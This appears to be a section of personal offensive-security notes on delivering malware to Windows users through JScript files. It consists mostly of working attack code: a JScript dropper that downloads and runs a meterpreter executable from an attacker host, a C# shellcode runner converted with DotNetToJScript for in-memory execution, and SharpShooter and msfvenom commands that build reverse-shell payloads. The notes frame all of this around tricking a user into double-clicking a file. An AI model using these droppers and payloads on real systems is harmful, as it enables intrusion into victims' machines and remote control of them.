### WScript

Default apps in Windows are worth being aware of. The default app for files with a `.ps1` extension is notepad. Therefore even if we successfully socially engineer a user into clicking on a malicious `.ps1`, it will not be executed, and will instead just be opened for editing. By contrast, `.js` files default to the Windows-Based Script Host, aka WScript. When executing `.js` files with `cscript` or `wscript` then the runtime in use is the JScript engine, a hilarious old and deprecated piece of shit. `JScript` provides many wonderful features for the attacker, for instance, direct interaction with ActiveX:

```javascript
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("cmd.exe");
```

Leveraging more advanced undocumented functionality of `JScript` to make HTTP requests we can implement a full dropper, requiring only a double-click on a `.js` file from a user. `met.exe` is assumed to be our prepped staged meterpreter payload, see `notes/shells.md`:

```javascript
var url = "http://192.168.x.x/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

This approach is simple, however lacking in subtlety, since it involves writing a file to the host. Staying on theme, we have an alternative way of keeping it all in memory. `JScript` alone lacks the functionality to run our staged payload in memory, however it _can_ deserialise and invoke a C\# DLL that has been base64 encoded and copied into the `JScript` file. The hard work here has been done for us by James Forshaw with `DotNetToJscript`. [The binary can be found here](https://github.com/tyranid/DotNetToJScript), when fed a `.dll` it will serialise and encode it as base64, embed the base64 as a string and then write a `Jscript` file around it with the purpose of decoding, deserialising, and finally invoking the binary:
```bash
DotNetToJScript.exe Payload.dll --lang=Jscript --ver=v4 -o not-sus-at-all.js
```
To build `Payload.dll`, take the following C\# and compile it as a DLL (VisualStudio or CLI):
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {
        byte[] buf = new byte[626] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8... // replace me!!
        }

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```

### Sharpshooter

All of the above is kinda the hard way from first principles. Its all repeatable, generic and automatable. Introducing `Sharpshooter`! To install:
```bash
cd /opt/
sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git
cd SharpShooter/
sudo apt install python-pip
sudo pip install -r requirements.txt
```
Generate meterpreter payload:
```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 -f raw -o /var/www/html/shell.txt
```
Convert it to a `.js` payload with `Sharpshooter`:
```bash
sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
```

TODO: Create the staged version of this payload leveraging HTML smuggling. One for when we come to use this in labs